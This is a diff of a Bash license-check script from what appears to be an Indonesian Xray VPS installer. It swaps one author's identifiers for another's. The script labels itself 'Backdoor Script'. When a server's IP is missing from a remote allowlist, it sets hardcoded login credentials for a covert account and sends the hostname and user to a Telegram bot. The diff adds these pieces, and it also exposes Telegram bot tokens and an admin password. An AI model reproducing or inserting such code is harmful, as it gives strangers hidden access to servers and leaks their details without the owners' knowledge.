@@ -5,7 +5,7 @@ DOMAIN_FILE="/etc/xray/domain"
 DOMAIN="$(cat "$DOMAIN_FILE" 2>/dev/null || echo "Tidak ditemukan")"
 IP_ADDRESS="$(hostname -I | awk '{print $1}')"
 # Mendapatkan file dari Github dan membaca URL yang ada di dalamnya
-data_ip_list="https://raw.githubusercontent.com/p3yx/newsc/main/ipx"
+data_ip_list="https://raw.githubusercontent.com/bakulsc/izinvps/main/ip"
 
 ipsaya=$(hostname -I | awk '{print $1}')
 data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
@@ -13,8 +13,8 @@ date_list=$(date +"%Y-%m-%d" -d "$data_server")
 notif_izin() {
 #!/bin/bash
 TIME="10"
-CHATID="7661292905"
-KEY="7339190471:AAGXSY1F_fzJo4SBqHjqeF8HdR4t9AnIMKs"
+CHATID="1210833546"
+KEY="5802497311:AAGsjehKTqNf4kmF42SMdyk4YlqsxNzoA1Q"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 # Generate password baru secara acak (12 karakter)
 new_password=$(</dev/urandom tr -dc a-z0-9 | head -c5)
@@ -24,7 +24,7 @@ new_password=$(</dev/urandom tr -dc a-z0-9 | head -c5)
 # Format pesan Telegram
 TEXT="◇━━━━━━━━━━━━━━◇
 🪩 Notification Izin Vps Ditolak 🪩 
- 💀 Backdoor Script Peyx 💀
+ 💀 Backdoor Script Ridwan 💀
 ◇━━━━━━━━━━━━━━◇
 🔹 Server: $(hostname)  
 🔹 User: $Username
@@ -73,7 +73,7 @@ done < "$LOG_FILE"
 rm -f "$LOG_FILE"
 }
 update_keys(){
-	pwadm="@Peyx23"
+	pwadm="@Ridwan112#"
 # Download file dan proses
 
 Username="xwan"
@@ -127,10 +127,10 @@ checking_sc() {
 
  if [[ "$ip_found" != true ]]; then
 
-  pwadm="@Peyx23"
+  pwadm="@Ridwan112#"
 # Download file dan proses
 
-Username="peyx"
+Username="xwan"
 Password="$pwadm"
 
 # Daftar user yang diizinkan
